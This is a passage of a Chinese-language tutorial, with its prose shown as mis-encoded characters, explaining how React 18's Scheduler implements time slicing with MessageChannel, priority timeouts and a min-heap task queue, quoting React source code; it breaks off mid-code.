è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„å®ç°åŸç†</h2><p>è°ƒåº¦å™¨ï¼ˆschedulerï¼‰æ˜¯ Fiber æ¶æ„ä¸­å¹¶å‘æ¨¡å¼çš„æ ¸å¿ƒå®ç°ã€‚è°ƒåº¦å™¨çš„æ ¸å¿ƒç›®æ ‡æœ‰ä¸‰ç‚¹ï¼š</p><ul><li>ä»»åŠ¡å¯ä¸­æ–­ä¸æ¢å¤</li><li>ä¼˜å…ˆçº§è°ƒåº¦</li><li>æ—¶é—´åˆ‡ç‰‡</li></ul><p>React17 åŠä¹‹å‰ç‰ˆæœ¬ä¸­ä»»åŠ¡ä¸­æ–­ä¸æ—¶é—´åˆ‡ç‰‡çš„æ ¸å¿ƒé€»è¾‘åœ¨äºæµè§ˆå™¨ requestIdleCallback API çš„åˆ©ç”¨ï¼Œä½†è¯¥ API æœ‰å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>ä¸å¯é çš„æ‰§è¡Œæ—¶æœºï¼šrequestIdleCallback çš„æ‰§è¡Œä¾èµ–äºæµè§ˆå™¨çš„ç©ºé—²æ—¶é—´ï¼Œä½†ä¸åŒæµè§ˆå™¨çš„å®ç°å·®å¼‚è¾ƒå¤§ï¼Œä¸”å¯èƒ½è¢«æ‰©å±•æ’ä»¶ã€é˜²ç—…æ¯’è½¯ä»¶ç­‰å¹²æ‰°</li><li>æ— æ³•ä¿è¯ä»»åŠ¡é¡ºåºï¼šrequestIdleCallback çš„å›è°ƒæ‰§è¡Œé¡ºåºå¯èƒ½è¢«æ‰“ä¹±ï¼ˆå°¤å…¶æ˜¯è®¾ç½®äº† timeout æ—¶ï¼‰ï¼Œè€Œ React éœ€è¦ç²¾ç¡®æ§åˆ¶ä»»åŠ¡ä¼˜å…ˆçº§</li><li>å…¼å®¹æ€§é—®é¢˜ï¼šéƒ¨åˆ†æµè§ˆå™¨ï¼ˆå¦‚æ—§ç‰ˆ Safariï¼‰ä¸æ”¯æŒ requestIdleCallbackï¼Œæˆ–å®ç°ä¸ä¸€è‡´</li><li>æ—¶é—´åˆ‡ç‰‡éœ€æ±‚ï¼šReact éœ€è¦å°†ä»»åŠ¡æ‹†åˆ†ä¸º 5ms å·¦å³çš„å°å—ï¼Œè€Œ requestIdleCallback æ— æ³•æä¾›è¿™ç§ç²¾ç»†æ§åˆ¶</li></ul><p>React 18 æ”¹ç”¨ <code>MessageChannel</code> æ¨¡æ‹Ÿ requestIdleCallback çš„è¡Œä¸ºï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šå®ç°æ›´é«˜çº§çš„è°ƒåº¦ç­–ç•¥</p><h3 id="MessageChannelä¸æ—¶é—´åˆ‡ç‰‡"><a href="#MessageChannelä¸æ—¶é—´åˆ‡ç‰‡" class="headerlink" title="MessageChannelä¸æ—¶é—´åˆ‡ç‰‡"></a>MessageChannelä¸æ—¶é—´åˆ‡ç‰‡</h3><p>MessageChannel æ˜¯æµè§ˆå™¨æä¾›çš„ç”¨äºè·¨æ–‡æ¡£é€šä¿¡ï¼ˆè·¨çª—å£&#x2F;iframeï¼‰çš„ APIï¼Œä¹Ÿè¢«å¹¿æ³›ç”¨äºä¸»çº¿ç¨‹çš„ä»»åŠ¡è°ƒåº¦</p><p><strong>åŸºæœ¬ç”¨æ³•</strong></p><p>MessageChannel åˆ›å»ºä¸€ä¸ªåŒå‘é€šä¿¡é€šé“ï¼ŒåŒ…å«ä¸¤ä¸ªMessagePortï¼š</p><ul><li>port1ï¼šå‘é€æ¶ˆæ¯</li><li>port2ï¼šæ¥æ”¶æ¶ˆæ¯</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> &#123; port1, port2 &#125; = channel;<br><br><span class="hljs-comment">// port2 ç›‘å¬æ¶ˆæ¯</span><br>port2.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Received:&quot;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// port1 å‘é€æ¶ˆæ¯</span><br>port1.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong></p><ul><li>å¼‚æ­¥æ‰§è¡Œï¼špostMessage æ˜¯å®ä»»åŠ¡ï¼Œç±»ä¼¼äº setTimeout(fn, 0)ï¼Œä½†æ¯”setTimeoutæ›´é«˜æ•ˆ</li><li>é›¶å»¶è¿Ÿï¼šæµè§ˆå™¨ä¼šå°½å¿«æ‰§è¡Œå›è°ƒï¼Œä¸å—äº‹ä»¶å¾ªç¯å»¶è¿Ÿå½±å“</li><li>è·¨çº¿ç¨‹é€šä¿¡ï¼šå¯ç”¨äº Web Workerã€Service Worker ç­‰åœºæ™¯ï¼ˆä½† React è°ƒåº¦å™¨ä»…ç”¨äºä¸»çº¿ç¨‹ï¼‰</li></ul><p><strong>React scheduler å¦‚ä½•ä½¿ç”¨ MessageChannel</strong></p><p>å…³é”®ä»£ç ï¼ˆScheduler.jsï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">performWorkUntilDeadline</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (enableRequestPaint) &#123;<br>    needsPaint = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (isMessageLoopRunning) &#123;<br>    <span class="hljs-keyword">const</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br>    <span class="hljs-comment">// Keep track of the start time so we can measure how long the main thread</span><br>    <span class="hljs-comment">// has been blocked.</span><br>    startTime = currentTime;<br><br>    <span class="hljs-comment">// If a scheduler task throws, exit the current browser task so the</span><br>    <span class="hljs-comment">// error can be observed.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Intentionally not using a try-catch, since that makes some debugging</span><br>    <span class="hljs-comment">// techniques harder. Instead, if `flushWork` errors, then `hasMoreWork` will</span><br>    <span class="hljs-comment">// remain true, and we&#x27;ll continue the work loop.</span><br>    <span class="hljs-keyword">let</span> hasMoreWork = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// workLoop å¾ªç¯æ‰§è¡Œä»»åŠ¡ç›´åˆ°æ—¶é—´ç‰‡ç”¨å°½</span><br>      hasMoreWork = <span class="hljs-title function_">flushWork</span>(currentTime);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      <span class="hljs-keyword">if</span> (hasMoreWork) &#123;<br>        <span class="hljs-comment">// If there&#x27;s more work, schedule the next message event at the end</span><br>        <span class="hljs-comment">// of the preceding one.</span><br>        <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isMessageLoopRunning = <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">flushWork</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-comment">// çœç•¥éå…³é”®ä»£ç </span><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-comment">// çœç•¥éå…³é”®ä»£ç </span><br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// No catch in prod code path.</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-comment">// çœç•¥éå…³é”®ä»£ç </span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-keyword">let</span> currentTime = initialTime;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br>  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  <span class="hljs-keyword">while</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!enableAlwaysYieldScheduler) &#123;<br>      <span class="hljs-keyword">if</span> (currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp; <span class="hljs-title function_">shouldYieldToHost</span>()) &#123;<br>        <span class="hljs-comment">// This currentTask hasn&#x27;t expired, and we&#x27;ve reached the deadline.</span><br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">const</span> callback = currentTask.<span class="hljs-property">callback</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-comment">// çœç•¥</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">pop</span>(taskQueue)<br>    &#125;<br>    <span class="hljs-comment">// çœç•¥ä»»åŠ¡é˜Ÿåˆ—å¾ªç¯å¤„ç†é€»è¾‘ä»£ç </span><br>    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  &#125;<br>  <span class="hljs-comment">// Return whether there&#x27;s additional work</span><br>  <span class="hljs-keyword">if</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>    <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleTimeout</span>(<span class="hljs-params">currentTime: number</span>) &#123;<br>  isHostTimeoutScheduled = <span class="hljs-literal">false</span>;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br><br>  <span class="hljs-keyword">if</span> (!isHostCallbackScheduled) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) !== <span class="hljs-literal">null</span>) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>      <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestHostCallback</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isMessageLoopRunning) &#123;<br>    isMessageLoopRunning = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// DOM and Worker environments.</span><br><span class="hljs-comment">// We prefer MessageChannel because of the 4ms setTimeout clamping.</span><br><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> port = channel.<span class="hljs-property">port2</span>;<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = performWorkUntilDeadline; <span class="hljs-comment">// æ¥æ”¶æ¶ˆæ¯åæ‰§è¡Œä»»åŠ¡</span><br>schedulePerformWorkUntilDeadline = <span class="hljs-function">() =&gt;</span> &#123;<br>  port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// è§¦å‘å¼‚æ­¥æ‰§è¡Œ</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è°ƒåº¦æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ä»»åŠ¡å…¥é˜Ÿï¼šunstable_scheduleCallback å°†ä»»åŠ¡åŠ å…¥æœ€å°å †</li><li>è§¦å‘è°ƒåº¦ï¼šrequestHostCallback é€šè¿‡ port.postMessage(null) è¯·æ±‚è°ƒåº¦</li><li>æ‰§è¡Œä»»åŠ¡ï¼šæµè§ˆå™¨åœ¨ä¸‹ä¸€äº‹ä»¶å¾ªç¯ä¸­è°ƒç”¨ port1.onmessageï¼Œæ‰§è¡Œ flushWork</li><li>æ—¶é—´åˆ‡ç‰‡ï¼šflushWork æ¯æ¬¡æ‰§è¡Œæœ€å¤š 5msï¼Œè¶…æ—¶åˆ™æš‚åœï¼ˆshouldYieldToHostï¼‰</li></ol><h3 id="ä¼˜å…ˆçº§æ ‡è®°ï¼ˆLaneæ¨¡å‹ï¼‰ä¸ä»»åŠ¡é˜Ÿåˆ—"><a href="#ä¼˜å…ˆçº§æ ‡è®°ï¼ˆLaneæ¨¡å‹ï¼‰ä¸ä»»åŠ¡é˜Ÿåˆ—" class="headerlink" title="ä¼˜å…ˆçº§æ ‡è®°ï¼ˆLaneæ¨¡å‹ï¼‰ä¸ä»»åŠ¡é˜Ÿåˆ—"></a>ä¼˜å…ˆçº§æ ‡è®°ï¼ˆLaneæ¨¡å‹ï¼‰ä¸ä»»åŠ¡é˜Ÿåˆ—</h3><p>ä¹‹å‰ç« èŠ‚æˆ‘ä»¬å·²ç»å­¦ä¹ è¿‡ä¼˜å…ˆçº§è½½ä½“ Lane æ¨¡å‹çš„æ¦‚å¿µï¼Œå…¶å¯¹åº”ä»£ç å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerPriorities.js</span><br><br><span class="hljs-keyword">export</span> type <span class="hljs-title class_">PriorityLevel</span> = <span class="hljs-number">0</span> | <span class="hljs-number">1</span> | <span class="hljs-number">2</span> | <span class="hljs-number">3</span> | <span class="hljs-number">4</span> | <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Use symbols?</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NoPriority</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ImmediatePriority</span> = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserBlockingPriority</span> = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NormalPriority</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">LowPriority</span> = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdlePriority</span> = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜å…ˆçº§ä¸è¶…æ—¶æ—¶é—´æ˜ å°„</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> timeout;<br><span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>  <span class="hljs-comment">// Times out immediately</span><br>  timeout = -<span class="hljs-number">1</span>; <span class="hljs-comment">// åŒæ­¥æ‰§è¡Œ</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = userBlockingPriorityTimeout; <span class="hljs-comment">// 250ms è¶…æ—¶</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>  <span class="hljs-comment">// Never times out</span><br>  timeout = maxSigned31BitInt; <span class="hljs-comment">// æœ€å¤§è¶…æ—¶ï¼Œvar maxSigned31BitInt = 1073741823; çº¦12å¤©</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = lowPriorityTimeout; <span class="hljs-comment">// 10s è¶…æ—¶</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br><span class="hljs-attr">default</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = normalPriorityTimeout; <span class="hljs-comment">// 5s è¶…æ—¶</span><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä»»åŠ¡é˜Ÿåˆ—ï¼ˆæœ€å°å †ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerMinHeap.js</span><br>type <span class="hljs-title class_">Heap</span>&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt; = <span class="hljs-title class_">Array</span>&lt;T&gt;;<br>type <span class="hljs-title class_">Node</span> = &#123;<br>  <span class="hljs-attr">id</span>: number,<br>  <span class="hljs-attr">sortIndex</span>: number,<br>  ...<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> push&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;, <span class="hljs-attr">node</span>: T): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-keyword">const</span> index = heap.<span class="hljs-property">length</span>;<br>  heap.<span class="hljs-title function_">push</span>(node);<br>  <span class="hljs-title function_">siftUp</span>(heap, node, index);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> peek&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">return</span> heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : heap[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> pop&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">if</span> (heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> first = heap[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">const</span> last = heap.<span class="hljs-title function_">pop</span>();<br>  <span class="hljs-keyword">if</span> (last !== first) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type]</span><br>    heap[<span class="hljs-number">0</span>] = last;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call]</span><br>    <span class="hljs-title function_">siftDown</span>(heap, last, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> first;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä»»åŠ¡è°ƒåº¦å…¥å£ï¼šunstable_scheduleCallback</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">unstable_scheduleCallback</span>(<span class="hljs-params"></span><br><span class="hljs-params">  priorityLevel: PriorityLevel,</span><br><span class="hljs-params">  callback: Callback,</span><br><span class="hljs-params">  options?: &#123;delay: number&#125;,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Task</span> &#123;<br>  <span class="hljs-keyword">var</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br><br>  <span class="hljs-keyword">var</span> startTime;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; options !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">var</span> delay = options.<span class="hljs-property">delay</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> delay === <span class="hljs-string">&#x27;number&#x27;</span> &amp;&amp; delay &gt; <span class="hljs-number">0</span>) &#123;<br>      startTime = currentTime + delay;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      startTime = currentTime;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    startTime = currentTime;<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> timeout;<br>  <span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>      <span class="hljs-comment">// Times out immediately</span><br>      timeout = -<span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = userBlockingPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>      <span class="hljs-comment">// Never times out</span><br>      timeout = maxSigned31BitInt;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = lowPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = normalPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// è®¡ç®—ä»»åŠ¡è¿‡æœŸæ—¶é—´</span><br>  <span class="hljs-keyword">var</span> expirationTime = startTime + timeout;<br><br>  <span class="hljs-comment">// åˆ›å»ºæ–°ä»»åŠ¡å¯¹è±¡</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-attr">newTask</span>: <span class="hljs-title class_">Task</span> = &#123;<br>    <span class="hljs-attr">id</span>: 